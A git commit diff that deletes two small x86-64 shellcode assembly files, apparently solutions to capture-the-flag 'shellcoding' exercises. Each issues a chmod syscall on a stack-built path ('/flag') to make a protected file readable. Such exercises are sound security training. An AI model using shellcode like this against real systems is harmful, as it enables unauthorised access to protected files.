cf19c490d5f113380cfa875403c13ce41669ac4a
Youssef Hasan <youssef.e.hasan12@gmail.com>
2025-11-02 17:41:29 +0200

    Delete program_security/program_security directory

--- program_security/program_security/shellcoding/diverse_delivery/shellcode.asm
+++
@@ -1,9 +0,0 @@
-global _start
-_start:
-        mov al, 0x5a
-	xor esi, esi
-	mov sil, 0x2d
-	push 0x2f
-	mov dword [rsp+1], 0x67616c66
-	mov rdi, rsp
-	syscall
--- program_security/program_security/shellcoding/payload_pocket/shellcode.asm
+++
@@ -1,5 +0,0 @@
-push 0x66
-mov rdi, rsp
-mov sil, 0x4
-mov al, 0x5a
-syscall
